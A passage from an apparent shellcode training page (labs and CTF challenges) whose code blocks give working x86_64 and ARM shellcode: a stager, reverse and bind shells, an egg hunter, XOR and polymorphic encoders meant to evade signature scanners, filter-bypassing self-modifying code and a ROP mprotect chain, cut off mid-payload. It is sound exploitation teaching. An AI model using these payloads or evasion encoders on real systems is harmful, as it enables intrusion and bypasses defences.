+<pre><code class="language-nasm">; stager.asm — reads stage2 from stdin, jumps to it
+; Total: ~15 bytes
+section .text
+global _start
+
+_start:
+    ; read(0, rsp, 0x400)
+    xor     eax, eax         ; syscall 0 = read
+    xor     edi, edi         ; fd = 0 (stdin)
+    mov     rsi, rsp         ; buf = stack pointer
+    mov     dh, 0x4          ; rdx = 0x400
+    syscall
+
+    ; jump to stage 2 (now on the stack)
+    jmp     rsp</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# Assemble the stager
+stager = asm('''
+    xor     eax, eax
+    xor     edi, edi
+    mov     rsi, rsp
+    mov     dh, 4
+    syscall
+    jmp     rsp
+''')
+log.info(f"Stager: {len(stager)} bytes")
+
+# Stage 2: full execve shellcode
+stage2 = asm(shellcraft.sh())
+
+p = process('./tiny_runner')  # binary that reads and executes shellcode
+p.send(stager)
+sleep(0.3)
+p.send(stage2)
+p.interactive()</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Reverse Shell Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write shellcode that connects back to an attacker's IP:port and redirects stdin/stdout/stderr to the socket, then spawns a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; reverse_shell.asm — connects to 127.0.0.1:4444
+section .text
+global _start
+
+_start:
+    ; socket(AF_INET, SOCK_STREAM, 0)
+    xor     rax, rax
+    mov     al, 41           ; syscall 41 = socket
+    xor     rdi, rdi
+    mov     dil, 2           ; AF_INET
+    xor     rsi, rsi
+    mov     sil, 1           ; SOCK_STREAM
+    xor     rdx, rdx         ; protocol = 0
+    syscall
+    mov     rdi, rax         ; save sockfd
+
+    ; connect(sockfd, &amp;addr, 16)
+    xor     rax, rax
+    mov     al, 42           ; syscall 42 = connect
+    ; Build sockaddr_in on stack
+    push    rdx              ; padding
+    push    dword 0x0100007f ; 127.0.0.1 (little-endian)
+    push    word  0x5c11     ; port 4444 (0x115c big-endian)
+    push    word  2          ; AF_INET
+    mov     rsi, rsp         ; ptr to sockaddr
+    mov     dl, 16           ; addrlen
+    syscall
+
+    ; dup2(sockfd, 0/1/2) — redirect stdio
+    xor     rsi, rsi
+.dup_loop:
+    xor     rax, rax
+    mov     al, 33           ; syscall 33 = dup2
+    syscall
+    inc     rsi
+    cmp     sil, 3
+    jne     .dup_loop
+
+    ; execve("/bin/sh", NULL, NULL)
+    xor     rdx, rdx
+    push    rdx
+    mov     rdi, 0x68732f6e69622f
+    push    rdi
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59
+    syscall</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# Using pwntools shellcraft for cleaner generation
+shellcode = asm(shellcraft.connect('127.0.0.1', 4444) +
+                shellcraft.dupsh('rbp'))  # rbp holds sockfd
+
+# Or: manual approach above
+# Test: nc -lvnp 4444  (in another terminal)</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Bind Shell Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write shellcode that binds to a port, listens for a connection, accepts it, and spawns a shell on the connected socket.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# socket → bind → listen → accept → dup2 → execve
+shellcode = asm('''
+    /* socket(AF_INET, SOCK_STREAM, 0) */
+    push    41
+    pop     rax
+    push    2
+    pop     rdi
+    push    1
+    pop     rsi
+    xor     edx, edx
+    syscall
+    mov     r12, rax                /* save sockfd */
+
+    /* bind(sockfd, {AF_INET, port=5555, INADDR_ANY}, 16) */
+    xor     eax, eax
+    push    rax                     /* INADDR_ANY */
+    push    word 0xb315             /* port 5555 = 0x15b3 */
+    push    word 2                  /* AF_INET */
+    mov     rsi, rsp
+    push    49
+    pop     rax                     /* bind */
+    mov     rdi, r12
+    push    16
+    pop     rdx
+    syscall
+
+    /* listen(sockfd, 0) */
+    push    50
+    pop     rax
+    mov     rdi, r12
+    xor     esi, esi
+    syscall
+
+    /* accept(sockfd, NULL, NULL) */
+    push    43
+    pop     rax
+    mov     rdi, r12
+    xor     esi, esi
+    xor     edx, edx
+    syscall
+    mov     rdi, rax                /* client fd */
+
+    /* dup2 loop */
+    xor     esi, esi
+.dup:
+    push    33
+    pop     rax
+    syscall
+    inc     esi
+    cmp     esi, 3
+    jne     .dup
+
+    /* execve("/bin/sh", NULL, NULL) */
+    xor     edx, edx
+    push    rdx
+    mov     rdi, 0x68732f6e69622f
+    push    rdi
+    mov     rdi, rsp
+    xor     esi, esi
+    push    59
+    pop     rax
+    syscall
+''')
+
+log.info(f"Bind shell shellcode: {len(shellcode)} bytes")
+# Test: run shellcode, then: nc 127.0.0.1 5555</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Shellcode Avoiding Specific Bytes</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write <code>execve("/bin/sh")</code> shellcode that avoids null bytes (<code>0x00</code>), newlines (<code>0x0a</code>), and spaces (<code>0x20</code>). These are common bad characters in string-based overflows.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+BAD_CHARS = b'\x00\x0a\x20'
+
+shellcode = asm('''
+    /* Zero registers without using xor reg,reg (which is fine, no bad bytes) */
+    xor     rdx, rdx
+    push    rdx
+
+    /* "/bin/sh" = 2f 62 69 6e 2f 73 68 00 — the 0x00 is the problem */
+    /* Solution: use "/bin//sh" (0x68732f2f6e69622f) — no null needed */
+    mov     rdi, 0x68732f2f6e69622f
+    push    rdi
+    mov     rdi, rsp
+
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59              /* 59 = 0x3b — not in bad chars */
+    syscall
+''')
+
+# Verify no bad characters
+for i, b in enumerate(shellcode):
+    if b in BAD_CHARS:
+        log.error(f"Bad byte 0x{b:02x} at offset {i}!")
+        break
+else:
+    log.success(f"Clean shellcode: {len(shellcode)} bytes, no bad chars")
+    print(enhex(shellcode))</code></pre>
+          </div>
+          <p><strong>Common bad character workarounds:</strong></p>
+          <ul>
+            <li><code>0x00</code>: Use <code>xor</code> to zero, <code>mov al</code> for small values, push-then-fix for strings</li>
+            <li><code>0x0a</code>: Avoid <code>mov al, 10</code> → use <code>mov al, 11; dec al</code></li>
+            <li><code>0x20</code>: Avoid <code>and</code> instructions that encode 0x20 → restructure</li>
+            <li>Use <code>pwntools</code>: <code>shellcraft.sh()</code> + <code>asm()</code> then check, or use <code>encoder.encode(sc, avoid=b'\x00\x0a\x20')</code></li>
+          </ul>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Egg Hunter Shellcode</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write a small egg hunter that searches process memory for a unique 8-byte "egg" tag, then jumps to the shellcode placed after the egg. Useful when the overflow buffer is too small for full shellcode but you can inject the payload elsewhere.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; egg_hunter.asm — searches memory for 0xDEADBEEFDEADBEEF
+; Uses access(2) syscall to safely probe pages without SIGSEGV
+section .text
+global _start
+
+_start:
+    xor     edi, edi             ; start from address 0
+
+.next_page:
+    or      di, 0xfff            ; align to end of page (0xfff)
+
+.next_addr:
+    inc     rdi
+
+    ; access(addr, 0) — returns -EFAULT (0xfffffff2) for unmapped pages
+    xor     eax, eax
+    mov     al, 21               ; syscall 21 = access
+    xor     esi, esi
+    syscall
+
+    cmp     al, 0xf2             ; EFAULT = page not mapped
+    je      .next_page           ; skip entire page
+
+    ; Page is readable — check for egg
+    mov     rax, 0xDEADBEEFDEADBEEF
+    mov     rsi, rdi
+    scasq                        ; compare [rdi] with rax, advance rdi
+    jnz     .next_addr
+    scasq                        ; check second copy (avoid finding ourselves)
+    jnz     .next_addr
+
+    ; Found! RDI now points past the egg — jump to shellcode
+    jmp     rdi</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+EGG = p64(0xDEADBEEFDEADBEEF)
+
+# The actual payload (placed somewhere in memory by the application)
+payload = EGG + EGG + asm(shellcraft.sh())
+
+# The egg hunter (placed in the small overflow buffer)
+egg_hunter = asm('''
+    xor     edi, edi
+.next_page:
+    or      di, 0xfff
+.next_addr:
+    inc     rdi
+    xor     eax, eax
+    mov     al, 21
+    xor     esi, esi
+    syscall
+    cmp     al, 0xf2
+    je      .next_page
+    mov     rax, 0xDEADBEEFDEADBEEF
+    mov     rsi, rdi
+    scasq
+    jnz     .next_addr
+    scasq
+    jnz     .next_addr
+    jmp     rdi
+''')
+
+log.info(f"Egg hunter: {len(egg_hunter)} bytes")
+log.info(f"Payload:    {len(payload)} bytes")</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Position-Independent Shellcode</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Write shellcode that works regardless of where it's loaded in memory. Use only RIP-relative addressing — no absolute addresses.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; All our shellcode so far is position-independent because:
+; 1. We use registers + stack (relative addressing)
+; 2. We push strings onto the stack instead of referencing .data
+; 3. We use syscall numbers, not absolute function addresses
+;
+; NON-position-independent example (WRONG):
+;   mov rdi, 0x601050    ; absolute address — breaks if loaded elsewhere
+;
+; Position-independent alternatives:
+;   lea rdi, [rip + string]   ; RIP-relative (works anywhere)
+;   push 0x68732f2f           ; build on stack (works anywhere)
+;   call next; next: pop rdi  ; get current RIP (old trick)
+
+section .text
+global _start
+
+_start:
+    ; Method: call/pop to get current address
+    jmp     .get_rip
+.got_rip:
+    pop     rdi             ; rdi = address of "/bin/sh" string below
+    xor     rsi, rsi
+    xor     rdx, rdx
+    xor     rax, rax
+    mov     al, 59
+    syscall
+
+.get_rip:
+    call    .got_rip        ; pushes address of next instruction
+    db      "/bin/sh", 0    ; string right after the call</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# RIP-relative approach using LEA
+shellcode = asm('''
+    lea     rdi, [rip + binsh]
+    xor     esi, esi
+    xor     edx, edx
+    mov     al, 59
+    syscall
+binsh:
+    .asciz "/bin/sh"
+''')
+# Note: this contains a null in the string — fine if injected via read()
+log.info(f"PIC shellcode: {len(shellcode)} bytes")</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Self-Decrypting Shellcode</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: XOR-encrypt your shellcode with a key, prepend a decoder stub that decrypts it at runtime. Bypasses simple signature-based detection.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# Original shellcode to encrypt
+original = asm(shellcraft.sh())
+KEY = 0x41  # single-byte XOR key
+
+# Encrypt
+encrypted = bytes([b ^ KEY for b in original])
+log.info(f"Original:  {len(original)} bytes")
+log.info(f"Encrypted: {enhex(encrypted)}")
+
+# Decoder stub (decrypts in-place, then falls through to decrypted code)
+decoder = asm(f'''
+    jmp     .encoded_start
+.decode:
+    pop     rsi                  /* rsi = address of encrypted shellcode */
+    mov     rcx, {len(encrypted)}
+    xor     rdx, rdx
+.loop:
+    xor     byte ptr [rsi + rdx], {KEY}
+    inc     rdx
+    cmp     rdx, rcx
+    jne     .loop
+    jmp     rsi                  /* jump to decrypted shellcode */
+.encoded_start:
+    call    .decode              /* pushes addr of encrypted code */
+''')
+
+# Final payload: decoder stub + encrypted shellcode
+payload = decoder + encrypted
+log.info(f"Total payload: {len(payload)} bytes")
+
+# Verify decoder doesn't contain the key byte in problematic places
+# (key=0x41='A' is common, might need different key)
+
+# Test
+p = run_shellcode(payload)
+p.interactive()</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Shellcode Golf (Minimal Bytes)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write the shortest possible <code>execve("/bin/sh")</code> shellcode for x86_64. Target: under 25 bytes.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; Golfed execve("/bin/sh") — 22 bytes
+; Uses: xor for zeroing, push-based string, cdq for rdx
+section .text
+global _start
+
+_start:
+    xor     esi, esi         ; 2 bytes — rsi = 0
+    mul     esi              ; 2 bytes — rax = rdx = 0
+    push    rax              ; 1 byte  — null terminator
+    mov     rdi, 0x68732f6e69622f  ; 10 bytes — "/bin/sh\0" (PROBLEM: contains 0x00!)
+
+    ; Fix: use "/bin//sh" instead = 0x68732f2f6e69622f (no embedded null)
+    mov     rdi, 0x68732f2f6e69622f  ; 10 bytes
+    push    rdi              ; 1 byte
+    push    rsp              ;
+    pop     rdi              ; 1 byte  — rdi = ptr to string
+    mov     al, 59           ; 2 bytes — syscall number
+    syscall                  ; 2 bytes</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# Optimized 22-byte version
+shellcode = asm('''
+    xor     esi, esi
+    mul     esi              /* rax = rdx = 0 */
+    push    rax
+    mov     rdi, 0x68732f2f6e69622f
+    push    rdi
+    push    rsp
+    pop     rdi
+    mov     al, 59
+    syscall
+''')
+
+log.info(f"Shellcode size: {len(shellcode)} bytes")
+assert len(shellcode) &lt;= 25, f"Too big: {len(shellcode)}"
+
+# Verify it works
+p = run_shellcode(shellcode)
+p.sendline(b'id')
+log.success(p.recvline().decode())</code></pre>
+          <p><strong>Tricks for size reduction:</strong></p>
+          <ul>
+            <li><code>cdq</code> / <code>mul esi</code> — zero rax+rdx in 2 bytes (vs 6 for two xor reg,reg)</li>
+            <li><code>push rsp; pop rdi</code> — 2 bytes (vs <code>mov rdi, rsp</code> = 3 bytes)</li>
+            <li><code>push imm; pop reg</code> — smaller than <code>mov reg, imm</code> for small values</li>
+            <li>Use 32-bit operands (<code>xor esi, esi</code>) — implicit zero-extension, shorter encoding</li>
+          </ul>
+        </div>
+
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-content" id="ctf">
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Shellcode Executor</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A binary reads your input into an RWX buffer and jumps to it. Send shellcode to get a shell and read the flag.</p>
+
+          <p><strong>Binary behavior (decompiled):</strong></p>
+<pre><code class="language-c">// The binary does essentially this:
+#include &lt;sys/mman.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    void *buf = mmap(NULL, 0x1000,
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    read(0, buf, 0x1000);
+    ((void(*)())buf)();
+}</code></pre>
+
+          <p><strong>Solution:</strong></p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# p = remote('challenge.ctf.com', 1337)
+p = process('./shellcode_exec')
+
+shellcode = asm(shellcraft.sh())
+p.send(shellcode)
+p.interactive()
+
+# Once you have a shell:
+# $ cat /flag.txt</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The binary gives you an RWX page and jumps to it. You just need to send raw shellcode bytes. Use <code>pwntools shellcraft.sh()</code> for the easiest solution. Don't forget <code>context.arch = 'amd64'</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Tiny Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The binary only reads 30 bytes of shellcode. Your payload must fit in 30 bytes and read + print the flag.</p>
+
+          <p><strong>Binary behavior:</strong></p>
+<pre><code class="language-c">void run_shellcode() {
+    char buf[30];
+    void *mem = mmap(NULL, 0x1000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    int n = read(0, mem, 30);  // only 30 bytes!
+    ((void(*)())mem)();
+}</code></pre>
+
+          <p><strong>Approach 1: Staged shellcode (read more shellcode via stdin)</strong></p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# p = remote('challenge.ctf.com', 1337)
+p = process('./tiny_shellcode')
+
+# Stage 1: read(0, rsp, 0x200) then jmp rsp (tiny stager)
+stager = asm('''
+    xor     eax, eax         /* syscall 0 = read */
+    xor     edi, edi         /* fd = 0 (stdin) */
+    mov     rsi, rsp         /* buf = rsp */
+    mov     dh, 0x2          /* rdx = 0x200 */
+    syscall
+    jmp     rsp              /* jump to stage 2 */
+''')
+
+print(f"Stager size: {len(stager)} bytes")
+assert len(stager) <= 30, f"Stager too big: {len(stager)}"
+
+# Stage 2: full shellcode (sent after stager)
+stage2 = asm(shellcraft.sh())
+
+p.send(stager)
+sleep(0.5)
+p.send(stage2)
+p.interactive()</code></pre>
+
+          <p><strong>Approach 2: Compact open/read/write in 30 bytes</strong></p>
+<pre><code class="language-nasm">; 29-byte flag reader (reads "flag" from current directory)
+; open("flag", 0) → read(fd, rsp, 64) → write(1, rsp, rax)
+xor     esi, esi             ; O_RDONLY
+mul     esi                  ; rax=0, rdx=0
+push    rax                  ; null terminator
+push    0x67616c66           ; "flag"
+mov     rdi, rsp
+mov     al, 2                ; open
+syscall
+mov     edi, eax             ; fd
+mov     rsi, rsp             ; buf
+mov     dl, 64               ; count
+xor     eax, eax             ; read
+syscall
+mov     edx, eax             ; bytes read
+xor     edi, edi
+inc     edi                  ; stdout
+mov     rsi, rsp
+mov     al, 1                ; write
+syscall</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>30 bytes is tight but doable. Two strategies: (1) write a tiny stager that <code>read()</code>s more shellcode from stdin, then <code>jmp rsp</code>. (2) Write a hyper-optimized open/read/write chain. Use <code>cdq</code>/<code>mul</code> for free zeroing, <code>push imm32</code> for short filenames, and <code>mov al, N</code> for syscall numbers.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Filtered Shellcode</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The binary reads your shellcode but rejects any input containing the bytes <code>\x0f</code> (blocks <code>syscall</code>), <code>\x80</code>...<code>\xff</code> (high bytes), and <code>\x00</code> (nulls). Get a shell or read the flag.</p>
+
+          <p><strong>Binary filter logic:</strong></p>
+<pre><code class="language-c">int check_shellcode(unsigned char *buf, int len) {
+    for (int i = 0; i &lt; len; i++) {
+        if (buf[i] == 0x00) return -1;  // no nulls
+        if (buf[i] == 0x0f) return -1;  // no 0x0f (blocks syscall = 0f 05)
+        if (buf[i] >= 0x80) return -1;  // no high bytes
+    }
+    return 0;  // allowed
+}</code></pre>
+
+          <p><strong>The problem:</strong> <code>syscall</code> is <code>0f 05</code>, and <code>0x0f</code> is banned. Without <code>syscall</code>, we can't invoke the kernel.</p>
+
+          <p><strong>Solution: Self-modifying shellcode</strong></p>
+          <p>Write the <code>0f 05</code> bytes at runtime by computing them from allowed values.</p>
+
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# p = remote('challenge.ctf.com', 1337)
+p = process('./filtered_shellcode')
+
+# Strategy: place a placeholder where 'syscall' should be,
+# then patch it at runtime using allowed instructions.
+
+# The key insight: we can use XOR/ADD/SUB to construct 0x0f and 0x05
+# at runtime and write them into our own code.
+
+shellcode = asm('''
+    /* Construct execve("/bin/sh", 0, 0) but with self-modifying syscall */
+
+    /* First, set up the execve args */
+    xor     rdx, rdx
+    push    rdx
+    mov     rdi, 0x68732f6e69622f    /* "/bin/sh" — check for high bytes! */
+    push    rdi
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59
+
+    /* Now we need "syscall" (0f 05), but 0x0f is banned. */
+    /* Self-modify: write 0f 05 into the placeholder below. */
+
+    /* Get address of placeholder using LEA + RIP-relative */
+    lea     rbx, [rip + placeholder]
+
+    /* Construct 0x0f: 0x10 - 1 = 0x0f  (both < 0x80, neither is 0x0f) */
+    mov     cl, 0x10
+    sub     cl, 1
+    mov     byte ptr [rbx], cl
+
+    /* Construct 0x05: just 0x05 (allowed) */
+    mov     byte ptr [rbx + 1], 0x05
+
+placeholder:
+    /* Two placeholder bytes that will be overwritten with 0f 05 */
+    .byte   0x41, 0x41    /* NOP-equivalent placeholder (inc ecx, inc ecx) */
+''')
+
+# Verify no banned bytes
+for i, b in enumerate(shellcode):
+    if b == 0x00:
+        print(f"WARNING: null at offset {i}")
+    if b == 0x0f:
+        print(f"WARNING: 0x0f at offset {i}")
+    if b >= 0x80:
+        print(f"WARNING: high byte 0x{b:02x} at offset {i}")
+
+p.send(shellcode)
+p.interactive()</code></pre>
+
+          <p><strong>Gotcha:</strong> The <code>mov rdi, 0x68732f6e69622f</code> immediate encodes high bytes! Fix by building the string on the stack with allowed-byte operations, or XOR-decode it.</p>
+
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+# Cleaner approach: all operations use only allowed bytes
+shellcode = asm('''
+    /* Build "/bin/sh" on stack using only allowed bytes */
+    xor     rdx, rdx
+    push    rdx                    /* null terminator */
+
+    /* "/bin/sh" = 2f 62 69 6e 2f 73 68 */
+    /* All these bytes are < 0x80, none are 0x0f or 0x00 — safe! */
+    /* But we need to push as a 64-bit value. movabs might encode badly. */
+    /* Use push imm32 trick: push low 4, then patch high bytes. */
+
+    /* Actually: push 0x68732f6e; then push 0x69622f2f ("//" is fine) */
+    /* 32-bit pushes sign-extend, so if bit 31 is 0, upper 32 = 0x00000000 — nulls in encoding! */
+    /* Use: sub rsp, 8; mov dword [rsp], val; mov dword [rsp+4], val */
+
+    sub     rsp, 16
+    mov     dword ptr [rsp], 0x6e69622f     /* "/bin" */
+    mov     dword ptr [rsp+4], 0x68732f2f   /* "//sh" */
+    lea     rdi, [rsp]
+    xor     rsi, rsi
+    xor     rax, rax
+    mov     al, 59
+
+    /* Self-modify to create syscall instruction */
+    lea     rbx, [rip + sc_placeholder]
+    mov     cl, 0x10
+    sub     cl, 1                /* cl = 0x0f */
+    mov     byte ptr [rbx], cl
+    mov     byte ptr [rbx + 1], 0x05
+
+sc_placeholder:
+    .byte 0x41, 0x41
+''')
+
+p = process('./filtered_shellcode')
+p.send(shellcode)
+p.interactive()</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The key challenge is that <code>syscall</code> (<code>0f 05</code>) contains the banned byte <code>0x0f</code>. Use self-modifying code: place a placeholder where <code>syscall</code> should go, then use arithmetic (<code>mov cl, 0x10; sub cl, 1</code>) to compute <code>0x0f</code> at runtime and write it into your own code before execution reaches it. Also watch out for <code>movabs</code> immediates &mdash; string constants may contain high bytes.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Socket Reuse</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The binary is a network service that <code>accept()</code>s your connection and reads shellcode. Instead of opening a new connection, reuse the existing socket fd for your shell. Find the fd number at runtime.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// The server does: clientfd = accept(listenfd, ...); read(clientfd, buf, 128); ((void(*)())buf)();
+// Your shellcode runs with clientfd still open — reuse it!</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The client fd is typically 4 (after stdin=0, stdout=1, stderr=2, listenfd=3). Use <code>dup2(4, 0); dup2(4, 1); dup2(4, 2); execve("/bin/sh")</code>. If unsure of the fd, loop from 3 to 10: <code>dup2(fd, 0)</code> and try each. Or use <code>getpeername(fd, ...)</code> — it returns 0 for valid sockets and -ENOTSOCK for non-sockets.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+# Reuse socket fd=4
+shellcode = asm('''
+    push    4
+    pop     rdi
+    xor     esi, esi
+.dup:
+    push    33
+    pop     rax
+    syscall
+    inc     esi
+    cmp     esi, 3
+    jne     .dup
+''' + shellcraft.sh())
+
+p = remote('challenge.ctf', 1337)
+p.send(shellcode)
+p.interactive()</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Polymorphic Decoder</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The binary runs your shellcode through a signature scanner before executing. It detects common patterns like <code>syscall</code>, <code>/bin/sh</code>, and <code>int 0x80</code>. Write polymorphic shellcode that changes its appearance on each run.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Signature patterns the scanner checks:
+# 0f 05 (syscall), cd 80 (int 0x80), 2f62696e (="/bin")
+# 48 31 ff (xor rdi,rdi — common shellcode start)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use a random XOR key generated at runtime (e.g., use <code>rdtsc</code> for a timestamp-based key). The decoder stub itself must avoid signatures. Encrypt the actual shellcode at exploit-gen time with a fixed key, but add NOP-equivalent junk instructions between decoder operations to change the byte pattern. Alternatives: use <code>add</code>/<code>sub</code>/<code>rol</code> instead of XOR, or split operations across multiple instructions.</p>
+<pre><code class="language-python">from pwn import *
+import random
+
+context.arch = 'amd64'
+
+payload = asm(shellcraft.sh())
+key = random.randint(1, 255)
+encrypted = bytes([b ^ key for b in payload])
+
+# Generate a decoder with random NOP-equivalents inserted
+nop_equivs = ['nop', 'xchg rax,rax', 'lea rsi,[rsi]', 'push rax; pop rax']
+
+decoder = asm(f'''
+    jmp     .enc
+.dec:
+    pop     rsi
+    {random.choice(nop_equivs)}
+    mov     rcx, {len(encrypted)}
+.lp:
+    xor     byte ptr [rsi + rcx - 1], {key}
+    {random.choice(nop_equivs)}
+    loop    .lp
+    jmp     rsi
+.enc:
+    call    .dec
+''')
+
+final = decoder + encrypted
+# Each run produces different bytes due to random NOPs + random key</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: No Syscall</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The binary uses seccomp to block <code>execve</code> (syscall 59). You can still use <code>open</code>/<code>read</code>/<code>write</code>. Write shellcode to read <code>/flag.txt</code> and send it to stdout.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># seccomp rules (via seccomp-tools dump):
+# A = sys_number
+# if A == execve: KILL
+# if A == execveat: KILL
+# default: ALLOW</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Since <code>execve</code> is blocked but <code>open</code>/<code>read</code>/<code>write</code> are allowed, write an ORW (open-read-write) chain: <code>open("/flag.txt", 0)</code> → <code>read(fd, rsp, 256)</code> → <code>write(1, rsp, 256)</code>. Use <code>pwntools shellcraft.open + shellcraft.read + shellcraft.write</code>.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+shellcode = asm(
+    shellcraft.open('/flag.txt') +
+    shellcraft.read('rax', 'rsp', 256) +
+    shellcraft.write(1, 'rsp', 256)
+)
+
+p = remote('challenge.ctf', 1337)
+p.send(shellcode)
+print(p.recvall())</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: ARM Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Target is an ARM (AArch32) binary with an RWX buffer. Write ARM shellcode for <code>execve("/bin/sh")</code>. Different syscall convention and instruction encoding.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># ARM syscall convention:
+# r7 = syscall number (execve = 11)
+# r0 = arg1, r1 = arg2, r2 = arg3
+# Invoke: svc #0</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use Thumb mode for shorter instructions. The key difference: ARM uses <code>svc #0</code> instead of <code>syscall</code>, and the syscall number goes in <code>r7</code>. Use <code>pwntools context.arch='arm'</code>.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'arm'
+
+# ARM Thumb mode execve
+shellcode = asm('''
+    .thumb
+    adr     r0, binsh
+    eor     r1, r1
+    eor     r2, r2
+    mov     r7, #11
+    svc     #0
+binsh:
+    .asciz  "/bin/sh"
+''')
+
+log.info(f"ARM shellcode: {len(shellcode)} bytes")
+# Run with: qemu-arm -g 1234 ./arm_binary  (for debugging)</code></pre>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: mprotect + Shellcode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">NX is enabled but you have a ROP chain available. Use ROP to call <code>mprotect()</code> making the stack executable, then jump to shellcode on the stack.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Leak a stack address, page-align it, then ROP to <code>mprotect(stack_page, 0x1000, 7)</code> (7 = RWX). After mprotect returns, a <code>jmp rsp</code> gadget or <code>call rsp</code> takes you to shellcode placed after the ROP chain on the stack.</p>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+elf = ELF('./mprotect_challenge')
+p = remote('challenge.ctf', 1337)
+
+# Leak stack address (via format string or other info leak)
+stack_leak = 0x7fffffffe000  # example
+stack_page = stack_leak &amp; ~0xfff  # page-align
+
+pop_rdi = 0x401293
+pop_rsi_r15 = 0x401291
+pop_rdx = 0x401199  # if available
+
+shellcode = asm(shellcraft.sh())
+
+payload = b'A' * 72
+# mprotect(stack_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
+payload += p64(pop_rdi) + p64(stack_page)
+payload += p64(pop_rsi_r15) + p64(0x1000) + p64(0)
+payload += p64(pop_rdx) + p64(7)
+payload += p64(elf.plt['mprotect'])
